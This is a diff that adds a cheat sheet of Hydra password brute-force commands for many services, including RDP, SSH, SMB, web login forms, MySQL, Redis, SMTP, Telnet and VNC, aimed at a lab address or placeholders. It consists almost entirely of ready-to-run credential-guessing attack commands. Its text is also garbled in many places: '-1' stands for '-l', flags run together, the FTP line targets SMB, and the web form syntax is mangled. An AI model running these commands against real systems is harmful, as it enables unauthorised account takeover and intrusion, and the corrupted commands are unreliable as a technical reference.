@@ -1,0 +1,37 @@
+GUI
+xhydra
+RDP
+hydra-v-f-L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
+SSH
+hydra -1 root -P passwords.txt -f ssh://10.0.2.5 -V
+SMB
+hydra -1 Administrator -P passwords.txt -f smb://10.0.2.5 -v
+FTP
+hydra 1 root -P passwords.txt -f smb://10.0.2.5 -v
+HTTP Basic Auth
+hydra -L users.txt -P password.txt 10.0.2.5 http-get/login/ -v
+HTTP Post
+hydra -L users.txt -P password.txt 10.0.2.5 http-post-form "/path/index.php: name /USER/&password=APASSA&enter Sign+in: Login name or password is incorrect" -V
+IMAP
+hydra -1 root -p passwords.txt -f imap://10.0.2.5 -v
+MySQL
+hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -v
+POP
+hydra -1 USERNAME -P passwords.txt -f pop3://10.0.2.5 -v
+Redis
+hydra -P password.txt redis://10.0.2.5 -V
+Rexec
+hydra 1 root -P password.txt rexec://10.0.2.5 -v
+Rlogin
+hydra -1 root -P password.txt rlogin://10.0.2.5 -V
+RSH
+hydra Lusername.txt rsh://10.0.2.5 -v
+RSP
+hydra -1 root -P passwords.txt <IP> rtsp
+SMTP
+hydra -1 <username> -P/path/to/passwords.txt <IP> smtp -V
+hydra -1 <username> -P/path/to/passwords.txt -s 587 <IP> -5 -v -v #Port 587 for SMTP with SSL
+Telnet
+hydra -1 root -P passwords.txt [-t 32] <IP> telnet
+VNC
+hydra -L /root/Desktop/user.txt -P/root/Desktop/pass.txt -s <PORT> <IP> vnc
